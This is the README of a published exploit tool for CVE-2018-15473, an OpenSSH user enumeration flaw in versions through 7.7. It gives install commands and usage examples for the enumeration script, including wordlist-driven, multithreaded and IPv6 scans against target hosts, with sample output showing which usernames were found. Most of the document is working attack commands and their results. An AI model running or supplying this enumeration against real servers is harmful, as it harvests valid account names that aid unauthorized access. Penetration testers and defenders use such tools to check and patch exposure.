CVE-2018-15473
---
OpenSSH through 7.7 is prone to a user enumeration vulnerability due to not delaying bailout for an
invalid authenticating user until after the packet containing the request has been fully parsed, related to
auth2-gss.c, auth2-hostbased.c, and auth2-pubkey.c.

Install 
---
You may need to install your distro's equivalent `openssl-dev` package
```bash
# NOTE: if you're installing on kali, you can skip the pip install; paramiko is already there.  

git clone https://gitlab.com/epi052/cve-2018-15473.git
cd cve-2018-15473
pip install -r requirements.txt 
# - OR - 
pipenv install -r requirements.txt  # if you're cool like that   
chmod u+x ssh-username-enum.py
```

Examples
---
A single username 
```bash
(cve-2018-15473)─> ./ssh-username-enum.py -u epi 192.168.1.2
[+] epi found!
```

Use a wordlist with 10 threads (the default is 4)
```bash
(cve-2018-15473)─> ./ssh-username-enum.py -t 10 -w /usr/share/metasploit-framework/data/wordlists/unix_users.txt 192.168.1.2
[+] avahi found!
[+] avahi-autoipd found!
[+] backup found!
[+] daemon found!
[+] bin found!
------8<------
```

IPv6 Address on port 2222 and INCREASED VERBOSITY! 
```bash
(cve-2018-15473)─> ./ssh-username-enum.py -6 -p 2222 -v -w /usr/share/metasploit-framework/data/wordlists/unix_users.txt '::1'
[-] 4Dgifts not found
[-] demo not found
[-] checkfs not found
[-] anon not found
[-] EZsetup not found
[-] auditor not found
[-] demos not found
[-] OutOfBox not found
[-] checkfsys not found
[+] avahi found!
[-] diag not found
[-] ROOT not found
[-] checksys not found
[-] cmwlogin not found
[+] avahi-autoipd found!
------8<------
```
